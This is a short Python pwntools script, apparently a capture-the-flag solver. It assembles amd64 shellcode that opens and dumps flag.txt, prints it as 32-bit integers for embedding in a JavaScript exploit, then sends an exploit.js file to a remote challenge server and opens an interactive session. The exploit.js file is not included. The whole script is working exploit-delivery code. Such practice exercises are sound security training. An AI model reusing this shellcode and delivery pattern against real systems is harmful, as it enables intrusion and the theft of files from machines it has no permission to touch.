from pwn import *


context.arch = "amd64"

shellcode = asm(shellcraft.open("flag.txt", 0))
shellcode += asm(shellcraft.sendfile(1, 3, 0, 0x100))

print("shellcode = [", end="")
i = 0
while(i < len(shellcode)):
    print(u32(shellcode[i:i+4].ljust(4, p8(0))), end=", ")
    i += 4
print("]")
print(shellcode)


pause()
r = remote("mc.ax", 31441)

exploit = open("exploit.js", "rt").read()
exploit += "\nEOF"
r.send(exploit)
r.interactive()